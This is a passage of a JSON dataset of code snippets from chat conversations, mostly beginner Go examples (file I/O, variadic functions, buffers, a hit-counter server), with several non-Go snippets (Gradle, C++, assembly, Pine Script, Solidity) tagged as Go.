{\n\t\tfmt.Printf(\"Bed: %s\\n\", hospital.Bed)\n\t\tfmt.Printf(\"CardID: %s\\n\", hospital.CardID)\n\t\tfmt.Printf(\"HospitalNumber: %s\\n\", hospital.HospitalNumber)\n\t\tfmt.Printf(\"Name: %s\\n\", hospital.Name)\n\t\tfmt.Printf(\"Gender: %s\\n\", hospital.Gender)\n\t\tfmt.Printf(\"Age: %s\\n\", hospital.Age)\n\t\tfmt.Printf(\"BirthDate: %s\\n\", hospital.BirthDate)\n\t\tfmt.Printf(\"RecordDate: %s\\n\", hospital.RecordDate)\n\t\tfmt.Println(\"-------------------\")\n\t}\n}",
    "filename": "88c89cfb1f2cfac08db3407018d5c4f3_0.go"
  },
  {
    "conversation_hash": "88c89cfb1f2cfac08db3407018d5c4f3",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "type HospitalInfo struct {\n\tBed            string `json:\"Bed\"`\n\tCardID         string `json:\"CardID\"`\n\tHospitalNumber string `json:\"HospitalNumber\"`\n\tName           string `json:\"Name\"`\n\tGender         string `json:\"Gender\"`\n\tAge            string `json:\"Age\"`\n\tBirthDate      string `json:\"BirthDate\"`\n\tRecordDate     string `json:\"RecordDate\"`\n}",
    "filename": "88c89cfb1f2cfac08db3407018d5c4f3_1.go"
  },
  {
    "conversation_hash": "460084bfde1e8b47fb48c7577a7cd20e",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "plugins {\n    id 'java'\n}\n\n// Define the version of Java you are using\nsourceCompatibility = '1.8' // or the version that corresponds to your JDK\n\nrepositories {\n    mavenCentral() // or jcenter(), mavenLocal(), etc.\n}",
    "filename": "460084bfde1e8b47fb48c7577a7cd20e_1.go"
  },
  {
    "conversation_hash": "af85121323570c64084f3c0e6d3818b7",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "// Assuming `Addable` is a concept you've defined\ntemplate<Addable T>\nvoid func(T param) {\n    Addable auto var = param; // C++20 syntax for constrained auto\n    // ... do something with var\n}",
    "filename": "af85121323570c64084f3c0e6d3818b7_6.go"
  },
  {
    "conversation_hash": "af85121323570c64084f3c0e6d3818b7",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "template<Addable T>\nvoid func(T param) {\n    T var = param; // Using T directly\n    // ... do something with var\n}",
    "filename": "af85121323570c64084f3c0e6d3818b7_7.go"
  },
  {
    "conversation_hash": "ca0a15f57dc5727a3d5bb2cce29973c9",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"sync/atomic\"\n)\n\nvar hitCount uint64\n\nfunc hitHandler(w http.ResponseWriter, r *http.Request) {\n\tatomic.AddUint64(&hitCount, 1)\n\tfmt.Fprintf(w, \"Hit counted\")\n}\n\nfunc statsHandler(w http.ResponseWriter, r *http.Request) {\n\tfmt.Fprintf(w, \"Total Requests: %d\", atomic.LoadUint64(&hitCount))\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/hit\", hitHandler)\n\thttp.HandleFunc(\"/api/dstat\", statsHandler)\n\thttp.ListenAndServe(\":5000\", nil)\n}",
    "filename": "ca0a15f57dc5727a3d5bb2cce29973c9_0.go"
  },
  {
    "conversation_hash": "5064c48edfe2a09056ba9f450a1fd05b",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "_asm {\n    mov edi, i      // используем edi для увеличения индекса в массиве words\n\n    loop_start:\n    mov al, [srcPtr]\n    cmp al, ' '\n    je space_found\n\n    mov [wordPtr], al\n    inc srcPtr\n    inc wordPtr\n    jmp continue_loop\n\n    space_found:\n    mov byte ptr [wordPtr], 0\n    inc edi\n    mov srcPtr, edi               // перемещаем указатель srcPtr на следующее слово\n    mov wordPtr, offset words     // перемещаем указатель wordPtr на следующее место в массиве words\n\n    continue_loop:\n    inc srcPtr\n    cmp byte ptr [srcPtr], 0\n    jne loop_start\n}",
    "filename": "5064c48edfe2a09056ba9f450a1fd05b_2.go"
  },
  {
    "conversation_hash": "4a05675f3b1c58927abcb45ca54fa94c",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\ta := [5]int{0, 2, 4, 6, 8}\n\tvar s []int = a[1:3]\n\n\tfmt.Println(a) // prints [0 2 4 6 8]\n\n\ts[0] = 3 // s[0] refers to a[1]\n\tfmt.Println(s) // prints [3 4]\n\tfmt.Println(a) // prints [0 3 4 6 8], you can see the change reflected in the array\n}",
    "filename": "4a05675f3b1c58927abcb45ca54fa94c_4.go"
  },
  {
    "conversation_hash": "8ff1674cbcecf25b192dce913847c080",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    // Assuming nums is an array or slice of integers\n    nums := []int{1, 2, 3, 4, 5}\n\n    // Initialize sum to 0\n    sum := 0\n\n    // Iterate over nums using for range and add each element to sum\n    for _, value := range nums {\n        sum += value\n    }\n\n    fmt.Println(\"The sum is:\", sum)\n}",
    "filename": "8ff1674cbcecf25b192dce913847c080_8.go"
  },
  {
    "conversation_hash": "d4769aa4dae5194fb1fa53e661423897",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "func myPrint(n int, nums ...int) {\n  for _, num := range nums {\n    fmt.Println(num / n)\n  }\n}",
    "filename": "d4769aa4dae5194fb1fa53e661423897_8.go"
  },
  {
    "conversation_hash": "d4769aa4dae5194fb1fa53e661423897",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc myPrint(nums ...int) {\n  for _, num := range nums {\n    fmt.Println(num)\n  }\n}\n\nfunc main() {\n  myPrint(1, 2, 3, 4)\n}",
    "filename": "d4769aa4dae5194fb1fa53e661423897_9.go"
  },
  {
    "conversation_hash": "d4769aa4dae5194fb1fa53e661423897",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc myPrint(nums ...int) {\n  fmt.Println(nums)\n}\n\nfunc main() {\n  myPrint(1, 2, 3, 4)\n}",
    "filename": "d4769aa4dae5194fb1fa53e661423897_10.go"
  },
  {
    "conversation_hash": "d4769aa4dae5194fb1fa53e661423897",
    "code_index": 11,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc myPrint(nums ...int) {\n  fmt.Printf(\"%v\\n\", nums) // Распаковка слайса и печать элементов, каждый на новой строке\n}\n\nfunc main() {\n  myPrint(1, 2, 3, 4)\n}",
    "filename": "d4769aa4dae5194fb1fa53e661423897_11.go"
  },
  {
    "conversation_hash": "d4769aa4dae5194fb1fa53e661423897",
    "code_index": 12,
    "language": "Go",
    "libraries": [],
    "code": "func myPrint(nums ...int) {\n  for _, v := range nums {\n    fmt.Printf(\"%v\\n\", v)\n  }\n}",
    "filename": "d4769aa4dae5194fb1fa53e661423897_12.go"
  },
  {
    "conversation_hash": "d4769aa4dae5194fb1fa53e661423897",
    "code_index": 13,
    "language": "Go",
    "libraries": [],
    "code": "func myPrint(nums ...int) {\n  for _, v := range nums {\n    fmt.Printf(\"%v\\n\", v)\n  }\n}",
    "filename": "d4769aa4dae5194fb1fa53e661423897_13.go"
  },
  {
    "conversation_hash": "d4769aa4dae5194fb1fa53e661423897",
    "code_index": 14,
    "language": "Go",
    "libraries": [],
    "code": "func myPrint(nums ...int) {\n  for _, v := range nums {\n    fmt.Printf(\"%v\\n\", v)\n  }\n}",
    "filename": "d4769aa4dae5194fb1fa53e661423897_14.go"
  },
  {
    "conversation_hash": "d4769aa4dae5194fb1fa53e661423897",
    "code_index": 15,
    "language": "Go",
    "libraries": [],
    "code": "func myPrint(nums ...int) {\n  for v := range nums {\n    fmt.Printf(\"%v\\n\", nums[v])\n  }\n}",
    "filename": "d4769aa4dae5194fb1fa53e661423897_15.go"
  },
  {
    "conversation_hash": "e97c6bca58545ac5e79b08c0ecdf4326",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tvar name string\n\tvar age int\n\tfmt.Print(\"Enter your name and age: \")\n\tfmt.Scan(&name, &age)\n\tfmt.Printf(\"Name: %s, Age: %d\\n\", name, age)\n}",
    "filename": "e97c6bca58545ac5e79b08c0ecdf4326_0.go"
  },
  {
    "conversation_hash": "e97c6bca58545ac5e79b08c0ecdf4326",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tvar name string\n\tvar age int\n\tfmt.Print(\"Enter your name and age: \")\n\tfmt.Scanf(\"%s %d\", &name, &age)\n\tfmt.Printf(\"Name: %s, Age: %d\\n\", name, age)\n}",
    "filename": "e97c6bca58545ac5e79b08c0ecdf4326_1.go"
  },
  {
    "conversation_hash": "e97c6bca58545ac5e79b08c0ecdf4326",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    var myString string\n    myString = \"Hello, World!\"\n    fmt.Println(myString)\n}",
    "filename": "e97c6bca58545ac5e79b08c0ecdf4326_2.go"
  },
  {
    "conversation_hash": "e97c6bca58545ac5e79b08c0ecdf4326",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    myString := \"Hello, World!\"\n    fmt.Println(myString)\n}",
    "filename": "e97c6bca58545ac5e79b08c0ecdf4326_3.go"
  },
  {
    "conversation_hash": "e97c6bca58545ac5e79b08c0ecdf4326",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strconv\"\n)\n\nfunc main() {\n\tvar intValue int = 42\n\tvar stringValue string = strconv.Itoa(intValue)\n\tfmt.Println(stringValue) // Output will be the string \"42\"\n}",
    "filename": "e97c6bca58545ac5e79b08c0ecdf4326_4.go"
  },
  {
    "conversation_hash": "e97c6bca58545ac5e79b08c0ecdf4326",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tvar intValue int = 42\n\tvar stringValue string = fmt.Sprintf(\"%d\", intValue)\n\tfmt.Println(stringValue) // Output will be the string \"42\"\n}",
    "filename": "e97c6bca58545ac5e79b08c0ecdf4326_5.go"
  },
  {
    "conversation_hash": "8ddf809c689c97cae13b0b84d2e3fba1",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n)\n\nfunc main() {\n    results := []string{\"w\", \"l\", \"w\", \"d\", \"w\", \"l\", \"l\", \"l\", \"d\", \"d\", \"w\", \"l\", \"w\", \"d\"}\n\n    // Define scores for each letter\n    scores := map[string]int{\n        \"w\": 3,\n        \"d\": 1,\n        \"l\": 0,\n    }\n\n    // Initialize counters\n    wCount, dCount, lCount := 0, 0, 0\n\n    // Loop through the results and sum up counts\n    for _, result := range results {\n        switch result {\n        case \"w\":\n            wCount += scores[\"w\"]\n        case \"d\":\n            dCount += scores[\"d\"]\n        case \"l\":\n            lCount += scores[\"l\"]\n        }\n    }\n\n    // Print results\n    fmt.Printf(\"Total score for 'w': %d\\n\", wCount)\n    fmt.Printf(\"Total score for 'd': %d\\n\", dCount)\n    fmt.Printf(\"Total score for 'l': %d\\n\", lCount)\n}",
    "filename": "8ddf809c689c97cae13b0b84d2e3fba1_0.go"
  },
  {
    "conversation_hash": "da5a51a48ea6dd86bc5c2c3fc93ab24c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "import (\n    \"fmt\"\n    \"reflect\"\n)\n\ntype User struct {\n    Name string\n    Age  int\n}\n\nfunc PrintFields(i interface{}) {\n    val := reflect.ValueOf(i).Elem()\n    for i := 0; i < val.NumField(); i++ {\n        field := val.Field(i)\n        fmt.Printf(\"%s: %v\\n\", val.Type().Field(i).Name, field.Interface())\n    }\n}\n\nfunc main() {\n    u := User{Name: \"John Doe\", Age: 30}\n    PrintFields(&u)\n}",
    "filename": "da5a51a48ea6dd86bc5c2c3fc93ab24c_0.go"
  },
  {
    "conversation_hash": "33b21b665a6ad1a2a5b7a9206eac9d04",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "name := \"SparkWordCount\"\n\nversion := \"0.1\"\n\nscalaVersion := \"2.12.10\"\n\nlibraryDependencies ++= Seq(\n  \"org.apache.spark\" %% \"spark-core\" % \"3.0.0\",\n  \"org.apache.spark\" %% \"spark-sql\" % \"3.0.0\"\n)",
    "filename": "33b21b665a6ad1a2a5b7a9206eac9d04_0.go"
  },
  {
    "conversation_hash": "62e15f90b6dac858b8afde3092ae5436",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "if errBill != nil {\n    com.Log.Error(\"query bill info failed email :%v,req :%v err :%v\", email, req, errBill)\n    utility.RespErrAbort(ctx, http.StatusOK, com.ErrServiceBusy)\n    return\n}",
    "filename": "62e15f90b6dac858b8afde3092ae5436_8.go"
  },
  {
    "conversation_hash": "5037d3fec19350f576c821972e825d4b",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "{\n    \"1002_02_050\": {\n        \"script_name\": \"RPC获取设备大类为非空\",\n        \"setup\": \"123\",\n        \"step\": \"1、调用接口magicBox.getDeviceClass校验返回字段type字段值为非空值【check1】\",\n        \"expect_result\": \"【check1】非空值\"\n    }\n}",
    "filename": "5037d3fec19350f576c821972e825d4b_2.go"
  },
  {
    "conversation_hash": "612fc3e7f628ae697bf8b1aff039b050",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "struct userData {\n    uint256 id;       // 32 bytes\n    address user;     // 20 bytes\n    uint40 timestamp; // Next 5 bytes fit into the same slot as address\n    uint8 royalty;    // Next 1 byte fits into the same slot as address and timestamp\n    // Padding of 6 bytes here to fill the slot\n    string message;   // Dynamically sized, starts in a new slot\n}",
    "filename": "612fc3e7f628ae697bf8b1aff039b050_0.go"
  },
  {
    "conversation_hash": "e7b0754feac5c88daaed2af270ed778e",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net/url\"\n)\n\nfunc main() {\n\t// Create a URL with some query values that might be escaped\n\tmyURL := &url.URL{\n\t\tScheme:   \"http\",\n\t\tHost:     \"example.com\",\n\t\tPath:     \"/path with special chars like spaces etc/\",\n\t\tRawQuery: \"q=some value\",\n\t}\n\n\t// Convert the URL struct to a string, which will escape certain characters\n\tescapedURL := myURL.String()\n\n\t// Output the escaped URL\n\tfmt.Println(\"Escaped URL:\", escapedURL)\n\n\t// If you need to 'unescape' specific parts, like Path\n\tunescapedPath, err := url.PathUnescape(myURL.Path)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// You would then reconstruct the URL string manually with the unescaped path\n\t// This can be error-prone and is generally not recommended!\n\tunescapedURL := fmt.Sprintf(\"%s://%s%s?%s\", myURL.Scheme, myURL.Host, unescapedPath, myURL.RawQuery)\n\n\t// Output the reconstructed 'unescaped' URL\n\tfmt.Println(\"Unescaped URL:\", unescapedURL)\n}",
    "filename": "e7b0754feac5c88daaed2af270ed778e_6.go"
  },
  {
    "conversation_hash": "6a1012a00a21df367852fe8047b6e830",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": ".:53 {\n    file db.root {\n        reload 60s\n    }\n    reload 2s\n    log\n    errors\n}",
    "filename": "6a1012a00a21df367852fe8047b6e830_0.go"
  },
  {
    "conversation_hash": "da16cbc3505cd2856556368ed426a4f2",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\n   import (\n       \"net/http\"\n       \"log\"\n   )\n\n   func main() {\n       http.HandleFunc(\"/chat\", chatHandler)\n       log.Fatal(http.ListenAndServe(\":8080\", nil))\n   }\n\n   func chatHandler(w http.ResponseWriter, r *http.Request) {\n       // Your chatbot logic here\n   }",
    "filename": "da16cbc3505cd2856556368ed426a4f2_2.go"
  },
  {
    "conversation_hash": "da16cbc3505cd2856556368ed426a4f2",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"encoding/json\"\n    \"fmt\"\n    \"net/http\"\n)\n\nfunc main() {\n    http.HandleFunc(\"/chat\", chatHandler)\n    fmt.Println(\"Starting chatbot server on :8080...\")\n    http.ListenAndServe(\":8080\", nil)\n}\n\nfunc chatHandler(w http.ResponseWriter, r *http.Request) {\n    var req map[string]string\n    if err := json.NewDecoder(r.Body).Decode(&req); err != nil {\n        http.Error(w, err.Error(), http.StatusBadRequest)\n        return\n    }\n    userMessage := req[\"message\"]\n    response, intent := processMessage(userMessage) // Define processMessage() based on your NLP solution\n    coinbaseResponse := interactWithCoinbase(intent) // Define interactWithCoinbase() for Coinbase API\n    json.NewEncoder(w).Encode(map[string]string{\"response\": coinbaseResponse})\n}\n\nfunc processMessage(message string) (response string, intent string) {\n    // Integrate with an NLP service to analyze the message and determine the intent\n    // Return a response and the intent\n    return \"\", \"\"\n}\n\nfunc interactWithCoinbase(intent string) string {\n    // Based on intent, interact with the Coinbase API\n    // Use a Go HTTP client to make requests to Coinbase API\n    // Return a text response that can be sent back to the user\n    return \"\"\n}",
    "filename": "da16cbc3505cd2856556368ed426a4f2_5.go"
  },
  {
    "conversation_hash": "c7e86a6ddcaa1fc0bc69e493fafe130d",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n)\n\n// FileSystemAPI provides basic file operations.\ntype FileSystemAPI interface {\n\tCreateFile(path string, content []byte) error\n\tReadFile(path string) ([]byte, error)\n\tUpdateFile(path string, content []byte) error\n\tDeleteFile(path string) error\n}\n\n// SimpleFS is a simple implementation of FileSystemAPI.\ntype SimpleFS struct{}\n\n// CreateFile creates a new file and writes content to it.\nfunc (fs *SimpleFS) CreateFile(path string, content []byte) error {\n\treturn ioutil.WriteFile(path, content, 0666)\n}\n\n// ReadFile reads the content of an existing file.\nfunc (fs *SimpleFS) ReadFile(path string) ([]byte, error) {\n\treturn ioutil.ReadFile(path)\n}\n\n// UpdateFile updates the content of an existing file.\nfunc (fs *SimpleFS) UpdateFile(path string, content []byte) error {\n\treturn ioutil.WriteFile(path, content, 0666)\n}\n\n// DeleteFile deletes an existing file.\nfunc (fs *SimpleFS) DeleteFile(path string) error {\n\treturn os.Remove(path)\n}\n\nfunc main() {\n\tfileSystem := &SimpleFS{}\n\tfilePath := \"example.txt\"\n\tcontent := []byte(\"Hello, World!\")\n\n\t// Create a file\n\tif err := fileSystem.CreateFile(filePath, content); err != nil {\n\t\tpanic(err)\n\t}\n\tfmt.Println(\"File created:\", filePath)\n\n\t// Read the file\n\treadContent, err := fileSystem.ReadFile(filePath)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tfmt.Println(\"File read:\", string(readContent))\n\n\t// Update the file\n\tnewContent := []byte(\"Hello, Go!\")\n\tif err := fileSystem.UpdateFile(filePath, newContent); err != nil {\n\t\tpanic(err)\n\t}\n\tfmt.Println(\"File updated.\")\n\n\t// Read the file again\n\tupdatedContent, err := fileSystem.ReadFile(filePath)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tfmt.Println(\"File read after update:\", string(updatedContent))\n\n\t// Delete the file\n\tif err := fileSystem.DeleteFile(filePath); err != nil {\n\t\tpanic(err)\n\t}\n\tfmt.Println(\"File deleted.\")\n}",
    "filename": "c7e86a6ddcaa1fc0bc69e493fafe130d_0.go"
  },
  {
    "conversation_hash": "85a37d18e997d08868be78e24544e59c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nindicator(\"Red Trendlines\", overlay=true)\n\nvar line topLine = na\nvar line bottomLine = na\n\nvar float highestHigh = na\nvar float lowestLow = na\nvar int count = 0\n\nvar bool newTrend = false\n\nif barstate.islast\n    newTrend := true\n\nif newTrend\n    // Reset variables for a new trend\n    highestHigh := high\n    lowestLow := low\n    topLine := na\n    bottomLine := na\n    count := 0\n\nfor i = 1 to barssince(newTrend)\n    // Find highest high and lowest low within same trendline\n    if high[i] > highestHigh\n        highestHigh := high[i]\n        count := 0\n    if low[i] < lowestLow\n        lowestLow := low[i]\n        count := 0\n    count := count + 1\n\n    if count >= 2\n        // Draw trendline connecting highest highs and lowest lows\n        if na(topLine)\n            topLine := line.new(x1=i-1, y1=highestHigh, x2=bar_index, y2=highestHigh, color=color.red, width=1)\n        else\n            line.set_x2(topLine, x=bar_index)\n        \n        if na(bottomLine)\n            bottomLine := line.new(x1=i-1, y1=lowestLow, x2=bar_index, y2=lowestLow, color=color.red, width=1)\n        else\n            line.set_x2(bottomLine, x=bar_index)\n\n    if count >= 3\n        highestHigh := high[i]\n        lowestLow := low[i]\n\nplotshape(count >= 2 ? low : na, color=color.red, style=shape.labelup, location=location.belowbar, text='HHHL')\nplotshape(count >= 3 ? high : na, color=color.red, style=shape.labeldown, location=location.abovebar, text='LHHL')",
    "filename": "85a37d18e997d08868be78e24544e59c_0.go"
  },
  {
    "conversation_hash": "85a37d18e997d08868be78e24544e59c",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nindicator(\"Red Trendlines\", overlay=true)\n\nvar line topLine = na\nvar line bottomLine = na\n\nvar float highestHigh = na\nvar float lowestLow = na\nvar int count = 0\n\nvar bool newTrend = false\n\nif barstate.islast\n    newTrend := true\n\nif newTrend\n    // Reset variables for a new trend\n    highestHigh := high\n    lowestLow := low\n    topLine := na\n    bottomLine := na\n    count := 0\n\nfor i = 1 to barssince(newTrend)\n    // Find highest high and lowest low within same trendline\n    if high[i] > highestHigh\n        highestHigh := high[i]\n        count := 0\n    if low[i] < lowestLow\n        lowestLow := low[i]\n        count := 0\n    count := count + 1\n\n    if count >= 2\n        // Draw trendline connecting highest highs and lowest lows\n        if na(topLine)\n            topLine := line.new(x1=i-1, y1=highestHigh, x2=bar_index, y2=highestHigh, color=color.red, width=1)\n        else\n            line.set_x2(topLine, x=bar_index)\n        \n        if na(bottomLine)\n            bottomLine := line.new(x1=i-1, y1=lowestLow, x2=bar_index, y2=lowestLow, color=color.red, width=1)\n        else\n            line.set_x2(bottomLine, x=bar_index)\n\n    if count >= 3\n        highestHigh := high[i]\n        lowestLow := low[i]\n\nplotshape(count >= 2 ? low : na, color=color.red, style=shape.labelup, location=location.belowbar, text=\"HHHL\")\nplotshape(count >= 3 ? high : na, color=color.red, style=shape.labeldown, location=location.abovebar, text=\"LHHL\")",
    "filename": "85a37d18e997d08868be78e24544e59c_1.go"
  },
  {
    "conversation_hash": "094d42fe17107b37521da25db3134342",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    // ...\n\n    sourceSets {\n        main {\n            assets.srcDirs 'src/main/assets', 'path/to/your/images'\n        }\n    }\n\n    // ...\n}",
    "filename": "094d42fe17107b37521da25db3134342_1.go"
  },
  {
    "conversation_hash": "a33d9ff2ac54938fe141fa4c3f5f031d",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    fmt.Println(\"Hello, World!\")\n}",
    "filename": "a33d9ff2ac54938fe141fa4c3f5f031d_5.go"
  },
  {
    "conversation_hash": "bd6aaa420db7e3f3adcb2790f0584dd3",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "{\n  2: 1/36,\n  3: 2/36,\n  4: 3/36,\n  5: 4/36,\n  6: 5/36,\n  7: 6/36,\n  8: 5/36,\n  9: 4/36,\n  10: 3/36,\n  11: 2/36,\n  12: 1/36\n}",
    "filename": "bd6aaa420db7e3f3adcb2790f0584dd3_1.go"
  },
  {
    "conversation_hash": "3183f866dc08b15e956037e95e2a5c82",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "type Person struct {\n       Name string\n       Age  int\n   }\n\n   type Speaker interface {\n       Speak() string\n   }",
    "filename": "3183f866dc08b15e956037e95e2a5c82_6.go"
  },
  {
    "conversation_hash": "3183f866dc08b15e956037e95e2a5c82",
    "code_index": 10,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "file, err := os.Open(\"filename.txt\")\nif err != nil {\n    // handle the error\n}\ndefer file.Close() // make sure to close the file when done\n\n// Read from the file\ndata := make([]byte, 100) // create a buffer to store the read data\ncount, err := file.Read(data)\nif err != nil {\n    // handle the error\n}\nfmt.Printf(\"read %d bytes: %q\\n\", count, data[:count])",
    "filename": "3183f866dc08b15e956037e95e2a5c82_10.go"
  },
  {
    "conversation_hash": "3183f866dc08b15e956037e95e2a5c82",
    "code_index": 11,
    "language": "Go",
    "libraries": [],
    "code": "data := []byte(\"Hello, Gophers!\")\n\nerr := os.WriteFile(\"filename.txt\", data, 0644) // WriteFile handles opening and closing the file\nif err != nil {\n    // handle the error\n}",
    "filename": "3183f866dc08b15e956037e95e2a5c82_11.go"
  },
  {
    "conversation_hash": "3183f866dc08b15e956037e95e2a5c82",
    "code_index": 13,
    "language": "Go",
    "libraries": [],
    "code": "err := os.Remove(\"filename.txt\")\nif err != nil {\n    // handle the error\n}\n\nerr = os.RemoveAll(\"dirname\")\nif err != nil {\n    // handle the error\n}",
    "filename": "3183f866dc08b15e956037e95e2a5c82_13.go"
  },
  {
    "conversation_hash": "3183f866dc08b15e956037e95e2a5c82",
    "code_index": 14,
    "language": "Go",
    "libraries": [],
    "code": "entries, err := os.ReadDir(\"path/to/directory\") // ReadDir returns a list of directory entries\nif err != nil {\n    // handle the error\n}\n\nfor _, entry := range entries {\n    fmt.Println(entry.Name())\n}",
    "filename": "3183f866dc08b15e956037e95e2a5c82_14.go"
  },
  {
    "conversation_hash": "3183f866dc08b15e956037e95e2a5c82",
    "code_index": 15,
    "language": "Go",
    "libraries": [],
    "code": "if _, err := os.Stat(\"filename.txt\"); err == nil {\n    // the file exists\n} else if os.IsNotExist(err) {\n    // the file does not exist\n} else {\n    // some other error occurred\n}",
    "filename": "3183f866dc08b15e956037e95e2a5c82_15.go"
  },
  {
    "conversation_hash": "3183f866dc08b15e956037e95e2a5c82",
    "code_index": 16,
    "language": "Go",
    "libraries": [],
    "code": "src, err := os.Open(\"source.txt\")\nif err != nil {\n    // handle error\n}\ndefer src.Close()\n\ndst, err := os.Create(\"destination.txt\")\nif err != nil {\n    // handle error\n}\ndefer dst.Close()\n\n_, err = io.Copy(dst, src) // Copy the contents to the destination file\nif err != nil {\n    // handle error\n}",
    "filename": "3183f866dc08b15e956037e95e2a5c82_16.go"
  },
  {
    "conversation_hash": "3183f866dc08b15e956037e95e2a5c82",
    "code_index": 17,
    "language": "Go",
    "libraries": [],
    "code": "import (\n    \"bytes\"\n    \"fmt\"\n)\n\nfunc readFromBuffer(buf *bytes.Buffer) string {\n    data := make([]byte, 100) // buffer to read to, up to 100 bytes\n    n, err := buf.Read(data)\n    if err != nil {\n        fmt.Println(\"Error reading buffer:\", err)\n        return \"\"\n    }\n    return string(data[:n])\n}\n\nfunc main() {\n    // Simulated file content in memory\n    buf := bytes.NewBufferString(\"Hello, Gophers! This is in-memory data.\")\n    \n    content := readFromBuffer(buf)\n    fmt.Println(content)\n}",
    "filename": "3183f866dc08b15e956037e95e2a5c82_17.go"
  },
  {
    "conversation_hash": "3183f866dc08b15e956037e95e2a5c82",
    "code_index": 18,
    "language": "Go",
    "libraries": [],
    "code": "import (\n    \"bytes\"\n    \"fmt\"\n)\n\nfunc writeToBuffer(buf *bytes.Buffer, data string) {\n    _, err := buf.WriteString(data) // Writes to the buffer\n    if err != nil {\n        fmt.Println(\"Error writing to buffer:\", err)\n    }\n}\n\nfunc main() {\n    // Buffer simulating a file\n    var buf bytes.Buffer\n\n    writeToBuffer(&buf, \"Hello, Gophers!\")\n    fmt.Println(buf.String()) // Print the buffer's content\n}",
    "filename": "3183f866dc08b15e956037e95e2a5c82_18.go"
  },
  {
    "conversation_hash": "3183f866dc08b15e956037e95e2a5c82",
    "code_index": 19,
    "language": "Go",
    "libraries": [
      "src"
    ],
    "code": "import (\n    \"bytes\"\n    \"fmt\"\n    \"io\"\n)\n\nfunc main() {\n    // Simulating source and destination \"files\" in memory\n    src := bytes.NewBufferString(\"Hello, Gophers! This is source data.\")\n    var dst bytes.Buffer // Destination buffer\n\n    // Copying data from src to dst, simulating file copy\n    _, err := io.Copy(&dst, src)\n    if err != nil {\n        fmt.Println(\"Error copying buffer:\", err)\n        return\n    }\n\n    // Contents of the destination buffer after the copy\n    fmt.Println(dst.String())\n}",
    "filename": "3183f866dc08b15e956037e95e2a5c82_19.go"
  },
  {
    "conversation_hash": "3183f866dc08b15e956037e95e2a5c82",
    "code_index": 20,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n)\n\n// GenerateBigrams splits a string into bigrams\nfunc GenerateBigrams(s string) []string {\n\twords := strings.Fields(s)\n\tvar bigrams []string\n\tfor i := 0; i < len(words)-1; i++ {\n\t\tbigrams = append(bigrams, words[i]+\" \"+words[i+1])\n\t}\n\treturn bigrams\n}\n\nfunc main() {\n\ttext := \"show me the money\"\n\tbigrams := GenerateBigrams(text)\n\tfmt.Println(bigrams)\n}",
    "filename": "3183f866dc08b15e956037e95e2a5c82_20.go"
  },
  {
    "conversation_hash": "3183f866dc08b15e956037e95e2a5c82",
    "code_index": 21,
    "language": "Go",
    "libraries": [],
